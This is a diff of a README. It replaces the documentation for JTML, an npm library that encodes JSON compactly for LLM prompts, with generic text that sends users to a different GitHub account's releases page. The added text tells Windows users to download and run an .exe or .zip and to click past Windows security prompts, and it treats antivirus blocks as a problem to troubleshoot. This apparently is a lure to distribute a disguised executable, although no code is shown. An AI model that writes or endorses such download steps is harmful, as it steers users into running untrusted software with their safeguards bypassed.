@@ -1,372 +1,205 @@
-# JTML
+# 🧩 jtml - Fewer Tokens, Clearer JSON Prompts
 
-**JSON Token-Minimized Language — schema-first encoding for token-efficient LLM prompts**
+[![Download jtml](https://img.shields.io/badge/Download%20jtml-Visit%20Releases-blue?style=for-the-badge)](https://github.com/ziyad248/jtml/releases)
 
-[![npm version](https://badge.fury.io/js/%40jtml%2Fcore.svg)](https://www.npmjs.com/package/@jtml/core)
-[![CI](https://github.com/thushanthbengre22-dev/jtml/actions/workflows/test.yml/badge.svg)](https://github.com/thushanthbengre22-dev/jtml/actions/workflows/test.yml)
-[![npm downloads](https://img.shields.io/npm/dm/@jtml/core.svg)](https://www.npmjs.com/package/@jtml/core)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+## 📦 What jtml does
 
-**[Live demo & docs → jtml.dev](https://www.jtml.dev/)**
+jtml helps you turn structured data into compact JSON for LLM prompts. It uses a schema-first approach, so the output stays clear and easy to control.
 
----
+Use it when you want to:
 
-## Why JTML?
+- send less text to a model
+- keep JSON shape consistent
+- reduce prompt size for structured data
+- work with token limits more easily
+- handle data that fits a known schema
 
-When feeding structured data to an LLM, JSON's repeated key names consume tokens on every row. For large API responses, this overhead is significant.
+This is useful for prompt engineering, chat apps, data extraction, and any workflow that sends JSON to an LLM.
 
-JTML declares the schema once and encodes values positionally — reducing token usage by ~60% on typical structured datasets.
+## 🖥️ Windows download and setup
 
-```
-JSON (287 tokens)                        JTML (109 tokens — 62% fewer)
-─────────────────────────────────────    ──────────────────────────────
-[                                        @schema users
-  {"id":1,"name":"Alice",                id:i name:s email:s age:i active:b
-   "email":"alice@example.com",
-   "age":30,"active":true},              @data
-  {"id":2,"name":"Bob",                  @array
-   "email":"bob@example.com",            1|Alice|alice@example.com|30|1
-   "age":25,"active":false}              2|Bob|bob@example.com|25|0
-]
-```
+1. Open the [jtml Releases page](https://github.com/ziyad248/jtml/releases)
+2. Find the latest release at the top
+3. Download the Windows file from the assets list
+4. If the file is zipped, extract it
+5. Open the app or run the file you downloaded
 
----
+If Windows shows a security prompt:
 
-## Installation
+1. Right-click the file
+2. Select Open
+3. Confirm the prompt if Windows asks
 
-```bash
-npm install @jtml/core
-```
+If you do not see a Windows file, look for the asset with names like:
 
----
+- `windows`
+- `win32`
+- `win64`
+- `.exe`
+- `.zip`
 
-## Quick Start
+## 🔍 What you need
 
-```typescript
-import { encode, decode, compareTokens } from '@jtml/core';
+For most Windows users, jtml should work on a modern Windows 10 or Windows 11 PC. A typical setup needs:
 
-const users = [
-  { id: 1, name: 'Alice', age: 30 },
-  { id: 2, name: 'Bob', age: 25 }
-];
+- a 64-bit Windows system
+- enough free space for the app and your files
+- internet access for the first download
+- a current version of Microsoft Edge or Chrome if you open the release page in a browser
 
-// Encode to JTML
-const jtml = encode(users);
+If the release includes a portable app, you may not need to install anything.
 
-// Decode back to JSON
-const decoded = decode(jtml);
+## ⚙️ How to use jtml
 
-// Measure token savings
-const stats = compareTokens(JSON.stringify(users), jtml);
-console.log(`Saved ${stats.savings} tokens (${stats.savingsPercent.toFixed(1)}%)`);
-```
+jtml is built for structured input and output. A common flow looks like this:
 
----
+1. Start with your data in JSON or a schema-like format
+2. Map the fields you want to keep
+3. Use the output in your prompt or tool chain
+4. Send less text to the model
+5. Keep the same structure across requests
 
-## Use Cases
+Example use cases:
 
-### Compress API responses before sending to an LLM
+- customer support data
+- product catalogs
+- form responses
+- extracted fields from documents
+- tool inputs and outputs
+- short, repeatable prompt payloads
 
-```typescript
-const response = await fetch('https://api.example.com/products?limit=500');
-const products = await response.json();
+## ✨ Main benefits
 
-// Include compressed data in the prompt
-const jtml = encode(products);
-const prompt = `Analyze these products and identify trends:\n\n${jtml}`;
-```
+- smaller prompt size
+- consistent JSON shape
+- easier data handling
+- less noise in structured data
+- better fit for token limits
+- simpler integration with LLM workflows
 
-### Fit more data in a fixed context window
+## 🧱 How schema-first encoding helps
 
-```typescript
-// Encode a large history with a named schema
-const historyJtml = encode(orderHistory, { schemaId: 'orders' });
+Many LLM prompts waste tokens by repeating field names, labels, and extra text. jtml focuses on the schema first, so the data stays organized and compact.
 
-// Reference the same schema for current data — no schema overhead on second call
-const currentJtml = encode(currentOrders, { schemaRef: 'orders', includeSchema: false });
-```
+That helps when you need to:
 
-### Validate JTML output before using it
+- send the same fields many times
+- compare outputs across runs
+- keep structured data stable
+- trim extra tokens from large JSON payloads
 
-```typescript
-import { decode, JTMLError } from '@jtml/core';
+For typical structured data, this can reduce prompt size a lot.
 
-try {
-  const data = decode(jtmlString);
-} catch (error) {
-  if (error instanceof JTMLError) {
-    console.error(`${error.code}: ${error.message}`);
-  }
-}
-```
+## 📁 Common files you may see in a release
 
----
+When you open the release page, you may see files such as:
 
-## API
+- `.exe` files for Windows
+- `.zip` archives
+- source code files
+- release notes
 
-### `encode(data, options?)`
+For most users, the correct choice is the Windows download file, usually an `.exe` or `.zip` file in the Assets section.
 
-Converts JSON data to JTML format.
+## 🧭 Step-by-step download guide
 
-```typescript
-import { encode } from '@jtml/core';
+1. Open the [release page](https://github.com/ziyad248/jtml/releases)
+2. Scroll to the latest version
+3. Look under Assets
+4. Download the Windows file
+5. Wait for the download to finish
+6. Open the file from your Downloads folder
+7. Follow the on-screen steps
 
-// Auto-infer schema
-const jtml = encode(data);
+If you downloaded a `.zip` file:
 
-// Custom schema ID
-const jtml = encode(data, { schemaId: 'products_v1' });
+1. Right-click the file
+2. Select Extract All
+3. Choose a folder
+4. Open the extracted folder
+5. Start the app from there
 
-// Reference an existing schema — omits schema block from output
-const jtml = encode(data, { schemaRef: 'products_v1', includeSchema: false });
-```
+## 🧪 Typical workflow
 
-**Options:**
+A simple workflow for jtml looks like this:
 
-```typescript
-interface JTMLEncodeOptions {
-  schemaId?: string;        // Schema identifier (default: 'default')
-  schemaRef?: string;       // Reference an already-registered schema
-  autoInferTypes?: boolean; // Infer types from data (default: true)
-  includeSchema?: boolean;  // Include schema block in output (default: true)
-}
-```
+1. Gather your structured data
+2. Pick the fields that matter
+3. Encode the data in a compact form
+4. Put the result into your prompt
+5. Send the prompt to your LLM
+6. Decode or read the output in the same shape
 
----
+This keeps your prompt clean and your data easier to manage.
 
-### `decode(jtml, options?)`
+## 🛠️ Troubleshooting
 
-Converts JTML back to JSON with type reconstruction.
+If the file does not open:
 
-```typescript
-import { decode } from '@jtml/core';
+- check that the download finished
+- move the file out of a compressed folder
+- try right-clicking and choosing Open
+- make sure Windows did not block the file
+- download the newest release again
 
-// Basic decode
-const result = decode(jtmlString);
+If Windows says the file is unsafe:
 
-// With pre-loaded schema cache
-const cached = decode(jtmlString, { schemaCache: mySchemaCache });
-```
+- confirm that you downloaded it from the official release page
+- right-click the file and check its Properties
+- if the file came in a zip, extract it first
 
-**Options:**
+If the app closes right away:
 
-```typescript
-interface JTMLDecodeOptions {
-  schemaCache?: Map<string, JTMLSchema>; // Pre-registered schemas
-  strict?: boolean;                       // Require schema (default: true)
-}
-```
+- try running it again from the extracted folder
+- check whether your antivirus blocked it
+- download the latest release from the page again
 
----
+## 📌 Best fit for
 
-### `encodeBatch(datasets, schemaId?)`
+jtml works well for people who deal with:
 
-Encodes multiple datasets under a shared schema.
+- LLM prompts
+- JSON payloads
+- token limits
+- schema-based data
+- structured output
+- prompt templates
+- serialization tasks
 
-```typescript
-import { encodeBatch } from '@jtml/core';
+## 🔗 Download again
 
-const jtml = encodeBatch([users, products, orders], 'batch_v1');
-```
+Use the official release page here: [https://github.com/ziyad248/jtml/releases](https://github.com/ziyad248/jtml/releases)
 
----
+## 🧾 Simple example of where it fits
 
-### Token Analysis
+If you have data like this:
 
-```typescript
-import { compareTokens, formatTokenStats, estimateCostSavings } from '@jtml/core';
+- name
+- email
+- order ID
+- status
+- date
 
-const stats = compareTokens(jsonString, jtmlString);
-console.log(formatTokenStats(stats));
-// Token Comparison:
-//   JSON:    287 tokens
-//   JTML:    109 tokens
-//   Savings: 178 tokens (62.0%)
+jtml helps you keep that shape stable while using fewer tokens in your prompt. That is useful when you repeat the same structure many times or send large batches of JSON to a model
 
-const cost = estimateCostSavings(stats, 3.0); // $3 per million tokens
-console.log(`$${cost.costSavedPer1M.toFixed(4)} saved per million requests`);
-```
+## 📘 Terms in plain English
 
-**Tokenizer options:** `'claude'` (default) | `'gpt'` | `'llama'`
+- **JSON**: a common way to store data in text form
+- **Schema**: a list of fields and their shape
+- **Token**: a small piece of text that a model reads
+- **Prompt**: the message you send to a model
+- **Serialization**: turning data into a text format
 
----
+## 🧩 Why this repo is useful
 
-### Schema Management
+The repo focuses on compact structured data for LLMs. That makes it a good fit if you want:
 
-```typescript
-import { schemaManager, inferSchema } from '@jtml/core';
+- fewer tokens
+- cleaner prompt data
+- more predictable JSON
+- easier handling of repeated structures
+- a simple way to prepare data for model use
 
-const schema = inferSchema(data, 'my_schema');
-schemaManager.register(schema);
+## 🗂️ Topics
 
-// Reuse across requests
-const jtml = encode(newData, { schemaRef: 'my_schema' });
-```
-
----
-
-## Format Specification
-
-### Type Markers
-
-| Marker | Type      | Encoded as               |
-|--------|-----------|--------------------------|
-| `i`    | Integer   | `42`                     |
-| `f`    | Float     | `3.14`                   |
-| `s`    | String    | `hello`                  |
-| `b`    | Boolean   | `1` (true) / `0` (false) |
-| `t`    | Timestamp | `2026-03-29T10:30:00Z`   |
-| `n`    | Null      | `` (empty)               |
-| `a`    | Array     | `[1,2,3]`                |
-| `o`    | Object    | `{key:value}`            |
-
-### Schema Definition
-
-```
-@schema user_profile
-id:i name:s email:s age:i? active:b tags:s[]
-
-@data
-@array
-1|Alice|alice@example.com|30|1|[admin,user]
-2|Bob|bob@example.com||0|[user]
-```
-
-### Optional Fields
-
-```
-@schema product
-id:i name:s price:f description:s?
-
-@data
-@array
-101|Laptop|999.99|High-performance laptop
-102|Mouse|29.99|
-```
-
-### Schema Reuse
-
-```
-@ref user_profile
-
-@data
-@array
-3|Charlie|charlie@example.com|35|1|[moderator]
-```
-
-### Special Characters
-
-| Character | Escaped as |
-|-----------|------------|
-| `\|`      | `\\|`      |
-| newline   | `\\n`      |
-| `\\`      | `\\\\`     |
-
----
-
-## CLI
-
-```bash
-# Install globally
-npm install -g @jtml/core
-
-# Encode JSON to JTML
-jtml encode input.json output.jtml
-
-# Decode JTML to JSON
-jtml decode input.jtml output.json
-
-# Compare token efficiency
-jtml compare dataset.json
-
-# Generate schema only
-jtml schema api-response.json
-
-# Validate JTML format
-jtml validate data.jtml
-```
-
-**Options:**
-
-```bash
-jtml encode data.json --schema-id "products_v1"
-jtml encode data.json --no-schema
-jtml compare data.json --tokenizer gpt
-```
-
----
-
-## Benchmarks
-
-Measured on real structured datasets. Token counts are estimates based on approximate tokenization.
-
-| Dataset              | JSON tokens | JTML tokens | Savings |
-|----------------------|-------------|-------------|---------|
-| User array (10)      | 287         | 109         | 62%     |
-| Product catalog (50) | 1,853       | 638         | 66%     |
-| Paginated API (25)   | 967         | 337         | 65%     |
-| Large dataset (1000) | 33,064      | 15,953      | 52%     |
-
-Average savings: **~61%**
-
----
-
-## Cost Savings
-
-At **$3 per million input tokens** (approximate Claude Sonnet pricing):
-
-| Requests/day | JSON cost/day | JTML cost/day | Daily savings |
-|--------------|---------------|---------------|---------------|
-| 1,000        | $0.86         | $0.33         | $0.53         |
-| 10,000       | $8.60         | $3.30         | $5.30         |
-| 100,000      | $86.00        | $33.00        | $53.00        |
-
-
-*Assumes 287-token average JSON payload per request. Actual savings vary by dataset.*
-
----
-
-## TypeScript Support
-
-All exports are fully typed. Import types directly:
-
-```typescript
-import type {
-  JTMLSchema,
-  JTMLField,
-  JTMLTypeInfo,
-  JTMLType,
-  JTMLEncodeOptions,
-  JTMLDecodeOptions,
-  TokenStats,
-  CostSavings
-} from '@jtml/core';
-```
-
----
-
-## Error Handling
-
-```typescript
-import { JTMLError } from '@jtml/core';
-
-try {
-  const data = decode(jtmlString);
-} catch (error) {
-  if (error instanceof JTMLError) {
-    // error.code: SCHEMA_NOT_FOUND | SCHEMA_PARSE_ERROR | SCHEMA_MISMATCH
-    //             SCHEMA_REQUIRED | INVALID_DATA | INVALID_VALUE
-    console.error(`${error.code}: ${error.message}`);
-  }
-}
-```
-
----
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md).
-
-## License
-
-MIT — see [LICENSE](LICENSE)
+ai, compression, json, language-model, llm, openai, prompt-engineering, serialization, tokens, typescript
